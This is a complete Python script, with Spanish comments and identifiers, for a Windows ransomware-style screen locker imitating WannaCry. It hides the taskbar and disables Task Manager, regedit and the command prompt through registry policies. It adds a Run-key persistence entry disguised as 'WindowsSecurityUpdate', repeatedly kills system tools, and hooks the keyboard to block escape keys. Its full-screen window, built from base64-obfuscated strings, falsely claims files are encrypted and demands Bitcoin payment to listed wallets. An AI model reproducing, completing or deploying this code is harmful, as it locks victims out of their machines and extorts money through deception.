import tkinter as tk
import threading
import ctypes
from ctypes import wintypes  # <--- Esta es la línea indispensable que debes agregar
import winreg
import time
import os
import sys
import subprocess
import hashlib
import base64

PASSWORD_HASH = "d8fb09c001878d655f9e31d4e0b0fe6bc6da64fa6f1f465d6c8e3ca2d2380f68"
TIMER_SECONDS = 7200

if os.name == "nt":
    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32
    hwnd_taskbar = user32.FindWindowW("Shell_TrayWnd", None)
    
    # Al importar wintypes arriba, el intérprete ya no fallará en esta línea:
    HOOKPROC = ctypes.WINFYPROC if hasattr(ctypes, "WINFYPROC") else ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
    keyboard_hook = None
else:
    user32 = kernel32 = hwnd_taskbar = keyboard_hook = None

def alternar_barra_tareas(mostrar=False):
    if user32 and hwnd_taskbar:
        comando = 5 if mostrar else 0
        user32.ShowWindow(hwnd_taskbar, comando)

def gestionar_politicas_sistema(bloquear=True):
    if os.name != "nt": return
    valor = 1 if bloquear else 0
    try:
        clave_sys = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(clave_sys, "DisableTaskMgr", 0, winreg.REG_DWORD, valor)
        winreg.SetValueEx(clave_sys, "DisableRegistryTools", 0, winreg.REG_DWORD, valor)
        winreg.CloseKey(clave_sys)
        
        clave_cmd = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Policies\Microsoft\Windows\System")
        winreg.SetValueEx(clave_cmd, "DisableCMD", 0, winreg.REG_DWORD, valor)
        winreg.CloseKey(clave_cmd)
    except Exception:
        pass

def gestionar_persistencia(activar=True):
    if os.name != "nt": return
    try:
        ruta_script = os.path.abspath(sys.argv)
        clave = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        if activar:
            winreg.SetValueEx(clave, "WindowsSecurityUpdate", 0, winreg.REG_SZ, f'"{ruta_script}"')
        else:
            try: winreg.DeleteValue(clave, "WindowsSecurityUpdate")
            except FileNotFoundError: pass
        winreg.CloseKey(clave)
    except Exception:
        pass

def bucle_asesino_procesos(stop_event):
    if os.name != "nt": return
    procesos = ["taskmgr.exe", "regedit.exe", "resmon.exe", "cmd.exe", "powershell.exe"]
    while not stop_event.is_set():
        for proc in procesos:
            try:
                subprocess.run(f"taskkill /f /im {proc}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                pass
        time.sleep(0.2)

def evaluar_teclas(nCode, wParam, lParam):
    if nCode >= 0:
        vk_code = ctypes.cast(lParam, ctypes.POINTER(ctypes.wintypes.DWORD)).contents.value
        if vk_code in (91, 92):
            return 1
        es_alt = (user32.GetKeyState(18) & 0x8000) != 0
        if es_alt and vk_code in (9, 115):
            return 1
        es_ctrl = (user32.GetKeyState(17) & 0x8000) != 0
        if es_ctrl and vk_code == 27:
            return 1
    return user32.CallNextHookEx(keyboard_hook, nCode, wParam, lParam)

def iniciar_gancho_teclado():
    global keyboard_hook
    if os.name != "nt": return
    pointer_callback = HOOKPROC(evaluar_teclas)
    modulo = kernel32.GetModuleHandleW(None)
    keyboard_hook = user32.SetWindowsHookExW(13, pointer_callback, modulo, 0)
    msg = ctypes.wintypes.MSG()
    while user32.GetMessageW(ctypes.byref(msg), 0, 0, 0) != 0:
        user32.TranslateMessage(ctypes.byref(msg))
        user32.DispatchMessageW(ctypes.byref(msg))

def autodestruccion_final():
    if os.name != "nt":
        sys.exit(0)
    ruta_exe = os.path.abspath(sys.argv)
    cmd_comando = f'choice /d y /t 2 > nul & del /f /q "{ruta_exe}" & exit'
    subprocess.Popen(cmd_comando, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    os._exit(0)

def liberar_sistema(root, stop_event):
    stop_event.set()
    alternar_barra_tareas(mostrar=True)
    gestionar_politicas_sistema(bloquear=False)
    gestionar_persistencia(activar=False)
    if user32 and keyboard_hook:
        user32.UnhookWindowsHookEx(keyboard_hook)
    root.destroy()
    autodestruccion_final()

def ejecutar_bloque_protegido():
    _0x4f2a = "V2FuYSBDcnlwdDByIDIuMA=="
    _0x9b1e = "T29vcHMsIHlvdXIgaW1wb3J0YW50IGZpbGVzIGFyZSBlbmNyeXB0ZWQu"
    _0x7c3d = "UGF5bWVudCB3aWxsIGJlIHJhaXNlZCBvbg=="
    _0x1a8f = "VGltZSBMZWZ0Og=="
    _0x3e5b = "U2VuZCAwLjAwMDQ2MzczIEJUQyAoJDMwKSB0bzo="
    _0x8f2d = "MTJ0OVlEUGd3dWVaOU55TWd3NTE5cDdBQThpc2pyNlNNdw=="
    
    return [base64.b64decode(x).decode('utf-8') for x in [_0x4f2a, _0x9b1e, _0x7c3d, _0x1a8f, _0x3e5b, _0x8f2d]]

def iniciar_interfaz():
    stop_event = threading.Event()
    alternar_barra_tareas(mostrar=False)
    gestionar_politicas_sistema(bloquear=True)
    gestionar_persistencia(activar=True)
    
    threading.Thread(target=bucle_asesino_procesos, args=(stop_event,), daemon=True).start()
    threading.Thread(target=iniciar_gancho_teclado, daemon=True).start()

    strs = ejecutar_bloque_protegido()

    root = tk.Tk()
    root.title(strs[0])
    root.configure(bg="#841414")
    root.overrideredirect(True)
    root.attributes("-topmost", True)
    root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}+0+0")

    def forzar_atencion(event=None):
        root.lift()
        root.focus_force()
    root.bind("<FocusOut>", forzar_atencion)
    root.protocol("WM_DELETE_WINDOW", lambda: None)

    header = tk.Label(root, text=strs[1], bg="#841414", fg="white", font=("Segoe UI", 24, "bold"))
    header.pack(pady=(40, 10))

    panel_izquierdo = tk.Frame(root, bg="#841414", bd=2, relief="groove")
    panel_izquierdo.place(x=50, y=140, width=420, height=600)

    lbl_payment = tk.Label(panel_izquierdo, text=strs[2], bg="#841414", fg="#ffcc00", font=("Segoe UI", 12, "bold"))
    lbl_payment.pack(pady=(20, 5))
    
    lbl_date1 = tk.Label(panel_izquierdo, text=strs[3], bg="#841414", fg="white", font=("Segoe UI", 11))
    lbl_date1.pack()
    
    timer_lbl = tk.Label(panel_izquierdo, text="02:00:00", bg="#841414", fg="#ff3333", font=("Consolas", 36, "bold"))
    timer_lbl.pack(pady=10)

    lbl_btc_title = tk.Label(panel_izquierdo, text=strs[4], bg="#841414", fg="#ffcc00", font=("Segoe UI", 12, "bold"))
    lbl_btc_title.pack(pady=(30, 5))
    
    btc_address = tk.Entry(panel_izquierdo, justify="center", font=("Consolas", 10), width=38)
    btc_address.insert(0, strs[5])
    btc_address.config(state="readonly")
    btc_address.pack(pady=5)

    panel_centro = tk.Frame(root, bg="white", bd=2, relief="sunken")
    panel_centro.place(x=500, y=140, width=900, height=600)
    
    texto_ayuda = tk.Text(panel_centro, bg="white", fg="black", font=("Segoe UI", 13), wrap="word", padx=25, pady=25)
    texto_ayuda.pack(fill="both", expand=True)
    
    wannacry_text = (
        "What has happened to my PC?\n"
        "Your important files and personal documents on this computer have been locked and encrypted\n"
        "using a secure cryptographic algorithm. You can no longer access them normally.\n\n"
        "How can I recover my files?\n"
        "To restore access and download the decryption key, you must send exactly $30 in Bitcoin\n"
        "to the wallet address shown on the left side of this window.\n\n"
        "Contact information:\n"
        "Once the transaction is complete, you will be given the key to unlock your files. "
        "If you run out of time, you must contact the following address: If.Y3wz.lqGs.z7KLv.7Du.vb015C.proton.me"
        "And send 30$ in bitcoin to this wallet:bc1p9gg7zeaft96ftppenygr8pc0zen8zauamnln2afjjx3x3da38f5qmkj839"
        "Do not close this application or attempt to restart the computer until verification is complete."
    )
    texto_ayuda.insert("1.0", wannacry_text)
    texto_ayuda.config(state="disabled")

    panel_inferior = tk.Frame(root, bg="#841414")
    panel_inferior.place(x=500, y=760)
    
    pw_var = tk.StringVar()
    entry = tk.Entry(panel_inferior, textvariable=pw_var, show="*", font=("Segoe UI", 14), width=24)
    entry.grid(row=0, column=0, padx=10)
    entry.focus_set()
    
    feedback = tk.Label(root, text="", bg="#841414", fg="white", font=("Segoe UI", 12, "bold"))
    feedback.place(x=500, y=810)

    def verificar_codigo():
        entrada_usuario = pw_var.get()
        hash_entrada = hashlib.sha256(entrada_usuario.encode()).hexdigest()
        
        if hash_entrada == PASSWORD_HASH:
            feedback.config(text="Success! Decrypting keys and removing temporary service...", fg="#00ff00")
            root.after(2000, lambda: liberar_sistema(root, stop_event))
        else:
            feedback.config(text="Error: Password incorrect or transaction not confirmed yet.", fg="#ff3333")
            pw_var.set("")
            entry.focus_set()

    btn = tk.Button(panel_inferior, text="Check Payment / Decrypt", command=verificar_codigo, font=("Segoe UI", 11, "bold"), bg="#dddddd", padx=10)
    btn.grid(row=0, column=1)

    tiempo_restante = TIMER_SECONDS
    def actualizar_reloj():
        nonlocal tiempo_restante
        if tiempo_restante > 0 and not stop_event.is_set():
            tiempo_restante -= 1
            horas = tiempo_restante // 3600
            minutos = (tiempo_restante % 3600) // 60
            segundos = tiempo_restante % 60
            try:
                timer_lbl.config(text=f"{horas:02d}:{minutos:02d}:{segundos:02d}")
                root.after(1000, actualizar_reloj)
            except Exception:
                pass
        elif tiempo_restante == 0 and not stop_event.is_set():
            liberar_sistema(root, stop_event)
            
    actualizar_reloj()
    root.mainloop()

if __name__ == "__main__":
    if os.name != "nt":
        sys.exit(0)
    iniciar_interfaz()